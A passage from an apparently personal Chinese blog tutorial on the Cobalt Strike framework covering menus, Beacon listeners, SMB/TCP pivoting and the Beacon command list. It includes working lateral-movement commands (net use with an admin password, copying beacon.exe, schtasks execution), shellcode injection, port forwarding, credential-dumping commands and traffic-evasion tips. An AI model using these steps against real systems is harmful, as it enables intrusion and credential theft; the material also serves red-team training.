<h3 id="Reporting菜单"><a href="#Reporting菜单" class="headerlink" title="Reporting菜单"></a>Reporting菜单</h3><ol>
<li><p>Activity Report ：本报告显示了此次参与的时间表。</p>
</li>
<li><p>Hosts Report ：此报告显示了在此次参与期间收集的主机信息。</p>
</li>
<li><p>Indicators of Compromise ：本报告记录了 Cobalt Strike 在此次攻击中产生的妥协指标。</p>
</li>
<li><p>Sessions Report ：此报告逐个会话地记录活动。</p>
</li>
<li><p>Social Engineering Report ：本报告记录了此项目的社会工程部分。</p>
</li>
<li><p>Tactics, Techniques, and Procedures ：这份报告将 Cobalt Strike 的行动映射到 MITRE 的对抗战术、技术和常识( ATT&amp;CK )矩阵。</p>
</li>
<li><p>Reset Data ：此操作将清除 Cobalt Strike 的数据模型。将丢失收集的所有信息。将无法取回这些信息。</p>
</li>
<li><p>Export Data ：导出数据</p>
</li>
</ol>
<h3 id="Help菜单"><a href="#Help菜单" class="headerlink" title="Help菜单"></a>Help菜单</h3><p>Homepage ：访问 <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a> 主页</p>
<p>Support ：进入 <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/support/">https://www.cobaltstrike.com/support/</a> 页面</p>
<p>Arsenal ：进入 <a target="_blank" rel="noopener" href="https://download.cobaltstrike.com/scripts">https://download.cobaltstrike.com/scripts</a> 页面</p>
<p>Malleable C2 Profile ：查看使用的 C2 配置文件</p>
<p>System Information ：提供有关 Cobalt Strike 客户端和服务器的信息</p>
<p>About ：关于，查看 Cobalt Strike 版本相关信息</p>
<h3 id="Beacon右键菜单"><a href="#Beacon右键菜单" class="headerlink" title="Beacon右键菜单"></a>Beacon右键菜单</h3><ul>
<li><p>Interact：打开Beacon会话</p>
</li>
<li><p>Access</p>
</li>
</ul>
<ol>
<li>Dump Hashes # 获取hash</li>
<li>Elevate # 提权</li>
<li>Golden Ticket # 生成黄金票据注入当前会话</li>
<li>Make token # 凭证转换</li>
<li>Run Mimikatz # 运行 Mimikatz</li>
<li>Spawn As # 用其他用户生成Cobalt Strike侦听器</li>
</ol>
<ul>
<li>Explore</li>
</ul>
<ol>
<li>Browser Pivot # 劫持目标浏览器进程</li>
<li>Desktop(VNC) # 桌面交互</li>
<li>File Browser # 文件浏览器</li>
<li>Net View # 命令Net View</li>
<li>Port Scan # 端口扫描</li>
<li>Process List # 进程列表</li>
<li>Screenshot # 截图</li>
</ol>
<ul>
<li>Pivoting</li>
</ul>
<ol>
<li>SOCKS Server # 代理服务</li>
<li>Listener # 反向端口转发</li>
<li>Deploy VPN # 部署VPN</li>
<li>Spawn：外部监听器 (如指派给MSF，获取meterpreter权限)</li>
</ol>
<ul>
<li>Session</li>
</ul>
<ol>
<li>Note # 备注</li>
<li>Remove # 删除</li>
<li>Sleep # 指定被控端休眠时间，默认60秒一次回传</li>
<li>Exit # 退出</li>
</ol>
<h2 id="CobaltStrike监听器详解"><a href="#CobaltStrike监听器详解" class="headerlink" title="CobaltStrike监听器详解"></a>CobaltStrike监听器详解</h2><h3 id="Beacon介绍"><a href="#Beacon介绍" class="headerlink" title="Beacon介绍"></a>Beacon介绍</h3><p>Beacon是Cobalt Strike运行在目标主机上的payload，Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机。它的工作方式与Metasploit Framework Payload类似。在实际渗透过程中，我们可以将其嵌入到可执行文件、添加到Word文档或者通过利用主机漏洞来传递Beacon。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403131300975.jpeg" alt="igl3uqu4f3"></p>
<p>Beacon在目标主机上运行之后，会主动向我们提前设置好的Listener发送请求信息</p>
<p>Team Server 控制器接收到请求后会检查是否有待执行的任务，如果有就会将任务下发到Beacon执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403131300455.jpeg" alt="072wjnxs1k"></p>
<p>默认的sleep时间：60s</p>
<h3 id="Beacon分类"><a href="#Beacon分类" class="headerlink" title="Beacon分类"></a>Beacon分类</h3><p>根据内置 Listener 的分类可以将Beacon进行分类，Listener是用来接收Beacon请求信息的<br>Cobalt Strike模块</p>
<ol>
<li>内部beacon</li>
</ol>
<ul>
<li>Beacon DNS</li>
<li>Beacon HTTP</li>
<li>Beacon HTTPS</li>
<li>Beacon SMB</li>
<li>Beacon TCP</li>
</ul>
<ol start="2">
<li>外部beacon</li>
</ol>
<p>与其他工具联合使用时才会使用到，一般用来派生会话到MSF</p>
<ul>
<li>Foreign HTTP</li>
<li>Foreign HTTPS</li>
</ul>
<h3 id="Beacon使用"><a href="#Beacon使用" class="headerlink" title="Beacon使用"></a>Beacon使用</h3><p>在目标上线CS后，右键目标 interact 使用 Beacon</p>
<p>在Cobalt Strike中它的心跳默认是60s (即sleep时间为60s，每一分钟目标主机 Beacon 与teamserver 通信一次)</p>
<p>如果sleep时间过长，在下载文件时花费时间明显过长，所以在测试时会把时间降低一点 。</p>
<p>一般拿到 Beacon 后先执行 sleep 修改到合适的睡眠时间，根据实战环境来调节，建议不要太快，不然流量会很明显。</p>
<p>Beacon 中不能直接输入 cmd 命令，比如要让目标机执行ipconfig这条cmd命令，对应的beacon命<br>令是 shell ipconfig</p>
<p>其他的beacon命令，可以在beacon中输入help查看命令帮助信息</p>
<h3 id="Beacon工作原理"><a href="#Beacon工作原理" class="headerlink" title="Beacon工作原理"></a>Beacon工作原理</h3><h4 id="Beacon-HTTP-HTTPS"><a href="#Beacon-HTTP-HTTPS" class="headerlink" title="Beacon HTTP&#x2F;HTTPS"></a>Beacon HTTP&#x2F;HTTPS</h4><blockquote>
<p>以HTTP或HTTPS协议建立Beacon连接</p>
</blockquote>
<ol>
<li>HTTP Beacon payload连接到C2控制器，它会发起一个GET请求，获取来自C2控制器的执行操作任务</li>
<li>如果C2控制器有要执行的任务，那么它会响应一组包含payload执行的所有任务的加密数据</li>
<li>否则HTTP Beacon payload会返回到睡眠状态，我们可以在payload配置中设置时间周期。</li>
<li>当Payload执行任务后产生输出时，HTTP Beacon payload会通过一个包含加密数据的POST请求发送给C2，这个POST请求中包含任务运行后的输出。如果没有输出，那么就没有这个POST请求。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403132348411.jpeg" alt="nwzt9dk28w"></p>
<p>通常创建一个简单的监听器，只需要配置以下选项即可：</p>
<ul>
<li><p>Name：监听器名字</p>
</li>
<li><p>Payload：选择Beacon类型</p>
</li>
<li><p>HTTP Hosts：配置HTTP Beacon回连主机地址</p>
</li>
<li><p>HTTP Host (Stager)：配置分阶段payload，Stager的请求地址，仅当Payload明确需要Stager配合时有效</p>
</li>
<li><p>HTTP Port (C2)：配置HTTP Beacon回连的监听端口</p>
</li>
<li><p>Host Rotation Strategy：CS4.3新增，在beacon通信时，可以选择更多的轮询方案以逃避检测、阻断，beacon回连主机策略</p>
</li>
<li><p>Profile：Malleable C2 配置文件，用于自定义通信流量特征</p>
</li>
<li><p>HTTP Port (Bind)：绑定监听端口，实现端口重定向</p>
</li>
<li><p>HTTP Host Header：设置内层真实域名，在使用域前置技术时使用</p>
</li>
<li><p>HTTP Proxy：为Payload指定代理</p>
</li>
</ul>
<h4 id="Beacon-DNS"><a href="#Beacon-DNS" class="headerlink" title="Beacon DNS"></a>Beacon DNS</h4><blockquote>
<p>以DNS协议流量建立Beacon连接</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403132348388.jpeg" alt="4gqysr2fdg"></p>
<ul>
<li>DNS Hosts：Beacon回连的主机，可以添加多个</li>
<li>Host Rotation Strategy：Beacon回连主机策略</li>
<li>HTTP Host (Stager)：配置Stager主机，仅当Payload明确需要Stager配合时有效</li>
<li>Profile：Malleable C2配置文件，用于自定义通信流量特征</li>
<li>DNS Port (Bind)：绑定监听端口，实现端口重定向</li>
<li>DNS Resolver：指定NS服务器</li>
</ul>
<h4 id="Beacon-SMB"><a href="#Beacon-SMB" class="headerlink" title="Beacon SMB"></a>Beacon SMB</h4><blockquote>
<p>以SMB协议流量建立Beacon连接，适用于内网横向</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_smb/bind_pipe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403132350639.jpeg" alt="wz6l5c7wob"></p>
<ul>
<li>简介</li>
</ul>
<p>SMB Beacon 使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子 Beacon 从父Beacon 获取到任务并发送。因为链接的 Beacon 使用 Windows 命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p>
<ul>
<li>前提条件</li>
</ul>
<ol>
<li>没有禁用IPC$连接、139和445端口、未使用防火墙等方式来阻止IPC$。</li>
<li>目标机器开启了相关的IPC$服务。</li>
<li>具有 SMB Beacon 的主机必须接受 445 端口上的连接。</li>
<li>只能链接由同一个 CobaltStrike实例管理的 Beacon。</li>
<li>利用这种 Beacon 横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</li>
</ol>
<h5 id="上线目标主机shell"><a href="#上线目标主机shell" class="headerlink" title="上线目标主机shell"></a>上线目标主机shell</h5><p>创建一个HTTP Beacon监听器，生成HTTP监听器木马文件，目标主机执行后上线Beacon会话</p>
<h5 id="创建SMB监听器"><a href="#创建SMB监听器" class="headerlink" title="创建SMB监听器"></a>创建SMB监听器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: smb</span><br><span class="line">Payload: Beacon SMB</span><br><span class="line">Pipename: 可默认或自定义</span><br></pre></td></tr></table></figure>

<h5 id="派生SMB-Beacon会话"><a href="#派生SMB-Beacon会话" class="headerlink" title="派生SMB Beacon会话"></a>派生SMB Beacon会话</h5><p>右键HTTP Beacon会话，进入Beacon控制台，执行 spawn &lt;SMB Beacon的监听器名称&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn smb</span><br></pre></td></tr></table></figure>

<p>命令执行成功后，可以看到一个新的Beacon会话，在IP地址后面带有 ∞∞ 字</p>
<h5 id="进程注入SMB-Beacon"><a href="#进程注入SMB-Beacon" class="headerlink" title="进程注入SMB Beacon"></a>进程注入SMB Beacon</h5><ul>
<li>inject</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Use: inject [pid] &lt;x86|x64&gt; [监听器]</span><br></pre></td></tr></table></figure>

<p>打开 [pid] 指定的进程并将 [监听器] 生成的 shellcode 注入到进程中运行</p>
<p>右键HTTP Beacon会话，进入Beacon控制台，执行 ps 命令查看主机所有进程信息，获取你想要注入shellcode的进程ID，然后执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject 11188 x64 smb</span><br></pre></td></tr></table></figure>

<p>命令执行成功后，可以看到一个新的Beacon会话，在IP地址后面带有 ∞∞ 字符。</p>
<h5 id="上线不出网主机"><a href="#上线不出网主机" class="headerlink" title="上线不出网主机"></a>上线不出网主机</h5><ul>
<li>会话中转</li>
</ul>
<ol>
<li>右键Beacon会话，设置监听器进行会话中转</li>
</ol>
<p>转发监听器可以利用已攻陷的机器作为代理，为其他Beacon会话的中转网络流量，即内网其他机器可通过连接攻陷机器上线。</p>
<p>以上操作实际是在beacon控制台执行了如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 4445 windows/beacon_reverse_tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Use:</span><br><span class="line">rportfwd [绑定端口] [转发目的主机] [转发目的端口]</span><br><span class="line">rportfwd stop [绑定端口]</span><br></pre></td></tr></table></figure>

<p>绑定目标主机上的指定端口。当目标主机的 [绑定端口] 被访问时，Cobalt Strike Teamserver 将<br>与 [转发目的主机&#x2F;端口] 建立连接，并使用Beacon在两个网络连接之间中继流量</p>
<ol start="2">
<li>使用上一步创建的监听器，生成木马文件</li>
<li>利用smb上传到目标不出网主机，通过 IPC$ 、计划任务等方式运行木马文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.1.3 /user:Administrator &quot;qaz@WSX&quot;</span><br><span class="line">shell dir \\192.168.1.3\C$</span><br><span class="line">upload C:\beacon.exe</span><br><span class="line">shell copy C:\beacon.exe \\192.168.1.3\C$</span><br><span class="line">shell schtasks /create /s 192.168.1.3 /u Administrator /p &quot;qaz@WSX&quot; /sc MINUTE /mo 1 /tn test /tr &quot;C:\\beacon.exe&quot;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>成功上线不出网主机的Beacon会话， 该会话为被动连接，不操作的不会回连，如果中转机会话断掉，该会话也会断掉。</li>
</ol>
<h5 id="连接与断开连接"><a href="#连接与断开连接" class="headerlink" title="连接与断开连接"></a>连接与断开连接</h5><p>在Beacon控制台可以使用 unlink 命令断开连接，使用 link 重新连接目标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Use: unlink [ip地址]</span><br><span class="line">     unlink [ip地址] [pid]</span><br><span class="line"></span><br><span class="line">断开与 SMB 命名管道或TCP Beacon的连接，指定IP地址或IP地址以及会话PID来断开特定Beacon的连接</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Use: link [目标] [管道名]</span><br><span class="line">     link [目标]</span><br><span class="line"></span><br><span class="line">连接SMB Beacon并建立控制通道，所有对于SMB Beacon的命令请求都将通过当前Beacon会话，可以指定一个显式的 [管道名] 以连接到特定管道。否则，将使用当前配置文件中的默认管道名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink 192.168.8.110 11188</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link 192.168.8.110</span><br></pre></td></tr></table></figure>

<h4 id="Beacon-TCP"><a href="#Beacon-TCP" class="headerlink" title="Beacon TCP"></a>Beacon TCP</h4><blockquote>
<p>仅与父 Beacon 通信，适用于内网横向移动</p>
</blockquote>
<blockquote>
<p>windows&#x2F;beacon_tcp&#x2F;bind_tcp</p>
</blockquote>
<p>命令格式同 smb 相似，不过此处连接目标IP的命令不是 link，而是 connect。取消连接目标机器的话对应的命令与 smb 同为 unlink</p>
<h5 id="创建TCP监听器"><a href="#创建TCP监听器" class="headerlink" title="创建TCP监听器"></a>创建TCP监听器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: tcp</span><br><span class="line">Payload: Beacon TCP</span><br><span class="line">Port: 默认或自定义</span><br></pre></td></tr></table></figure>

<h5 id="CS生成Payload"><a href="#CS生成Payload" class="headerlink" title="CS生成Payload"></a>CS生成Payload</h5><p>通过上一步创建的TCP监听器，生成 stageless 的 payload</p>
<h5 id="目标主机执行"><a href="#目标主机执行" class="headerlink" title="目标主机执行"></a>目标主机执行</h5><p>把上一步生成的Payload上传到目标主机执行，执行后会在目标主机监听配置监听器时配置的端口</p>
<h5 id="连接上线Beacon"><a href="#连接上线Beacon" class="headerlink" title="连接上线Beacon"></a>连接上线Beacon</h5><ul>
<li>connect</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Use: connect [目标]</span><br><span class="line">     connect [目标] [端口]</span><br></pre></td></tr></table></figure>

<p>连接TCP Beacon并建立控制通道。所有对于TCP Beacon的命令请求都将通过当前Beacon会话，使用 “unlink” 命令来断开TCP Beacon</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.81.221</span><br><span class="line">unlink 192.168.81.221 2608</span><br></pre></td></tr></table></figure>

<h4 id="Beacon命令"><a href="#Beacon命令" class="headerlink" title="Beacon命令"></a>Beacon命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help</span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     匹配过程的欺骗参数</span><br><span class="line">    blockdlls                 阻止子进程中的非Microsoft DLL</span><br><span class="line">    browserpivot              设置浏览器 pivot 会话</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    cd                        变更目录</span><br><span class="line">    checkin                   Call home and post data</span><br><span class="line">    clear                     清除 beacon 队列</span><br><span class="line">    connect                   通过TCP连接到Beacon peer</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    cp                        复制文件</span><br><span class="line">    dcsync                    从DC提取密码哈希</span><br><span class="line">    desktop                   查看目标桌面并与之交互</span><br><span class="line">    dllinject                 将反射DLL注入到进程中</span><br><span class="line">    dllload                   使用LoadLibrary()将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标上的驱动器</span><br><span class="line">    elevate                   在提升权限的环境中生成会话</span><br><span class="line">    execute                   在目标上执行程序（无输出）</span><br><span class="line">    execute-assembly          在目标内存中执行本地 .NET 程序</span><br><span class="line">    exit                      终止beacon会话</span><br><span class="line">    getprivs                  在当前令牌上启用系统特权</span><br><span class="line">    getsystem                 尝试获得SYSTEM</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希</span><br><span class="line">    help                      帮助菜单</span><br><span class="line">    inject                    在特定进程中产生会话</span><br><span class="line">    inline-execute            在此会话中运行Beacon Object File</span><br><span class="line">    jobkill                   杀死长期运行的后渗透任务</span><br><span class="line">    jobs                      列出长期运行的后渗透任务</span><br><span class="line">    jump                      在远程主机上生成会话</span><br><span class="line">    kerberos_ccache_use       将缓存中的kerberos tickets应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除本次会议中的kerberos tickets</span><br><span class="line">    kerberos_ticket_use       将kerberos tickets应用于此会话</span><br><span class="line">    keylogger                 将键盘记录器注入进程</span><br><span class="line">    kill                      杀死进程</span><br><span class="line">    link                      通过命名管道连接到Beacon peer</span><br><span class="line">    logonpasswords            使用mimikatz转储凭证和哈希</span><br><span class="line">    ls                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz命令</span><br><span class="line">    mkdir                     创建目录</span><br><span class="line">    mode dns                  将DNS A记录用作数据通道（仅DNS beacon）</span><br><span class="line">    mode dns-txt              将DNS TXT记录用作数据通道（仅DNS beacon）</span><br><span class="line">    mode dns6                 将DNS AAAA记录用作数据通道（仅DNS beacon）</span><br><span class="line">    mv                        移动文件</span><br><span class="line">    net                       网络和主机枚举工具</span><br><span class="line">    note                      给beacon分配一个注释</span><br><span class="line">    portscan                  扫描网络以查找开放服务</span><br><span class="line">    powerpick                 通过 Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入Powershell脚本</span><br><span class="line">    ppid                      为产生的post-ex jobs设置父ID</span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psinject                  在特定进程中执行powershell命令</span><br><span class="line">    pth                       使用Mimikatz进行哈希传递</span><br><span class="line">    pwd                       打印当前目录</span><br><span class="line">    reg                       查询注册表</span><br><span class="line">    remote-exec               在远程主机上运行命令</span><br><span class="line">    rev2self                  恢复为原始令牌</span><br><span class="line">    rm                        删除文件或文件夹</span><br><span class="line">    rportfwd                  设置反向端口转发</span><br><span class="line">    run                       在目标上执行程序（返回输出）</span><br><span class="line">    runas                     以其他用户身份执行程序</span><br><span class="line">    runasadmin                在提升权限的环境中执行程序</span><br><span class="line">    runu                      在另一个PID下执行程序</span><br><span class="line">    screenshot                截屏</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     通过cmd.exe执行命令</span><br><span class="line">    shinject                  将Shellcode注入进程</span><br><span class="line">    shspawn                   生成进程并将shellcode注入其中</span><br><span class="line">    sleep                     设置beacon睡眠时间</span><br><span class="line">    socks                     启动SOCKS4a服务器以中继流量</span><br><span class="line">    socks stop                停止SOCKS4a服务器</span><br><span class="line">    spawn                     产生一个会话</span><br><span class="line">    spawnas                   以其他用户身份发起会话</span><br><span class="line">    spawnto                   设置可执行文件以将进程生成为</span><br><span class="line">    spawnu                    在另一个进程下产生会话</span><br><span class="line">    ssh                       使用SSH在主机上生成一个SSH会话</span><br><span class="line">    ssh-key                   使用SSH在主机上生成一个SSH会话</span><br><span class="line">    steal_token               从进程中窃取访问令牌</span><br><span class="line">    timestomp                 将时间戳从一个文件应用到另一个文件</span><br><span class="line">    unlink                    与父Beacon断开连接</span><br><span class="line">    upload                    上传文件</span><br></pre></td></tr></table></figure>

<h2 id="补充资料"><a href="#补充资料" class="headerlink" title="补充资料"></a>补充资料</h2><p><a target="_blank" rel="noopener" href="https://wbglil.gitbook.io/cobalt-strike">https://wbglil.gitbook.io/cobalt-strike</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">hihopkc</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://hihopkc.github.io/posts/16261.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://hihopkc.github.io/posts/16261.html')">CobaltStrike渗透框架</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://hihopkc.github.io/posts/16261.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=CobaltStrike渗透框架&amp;url=https://hihopkc.github.io/posts/16261.html&amp;pic=https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308071816899.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hihopkc.github.io" target="_blank">嘻哈磕碜のBlogs</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202403230009126.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/59793.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308290035016.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023年第三届陕西省大学生网络安全技能大赛WP</div></div></a></div><div class="next-post pull-right"><a href="/posts/c817.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307301825950.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub靶机练习——DC1</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 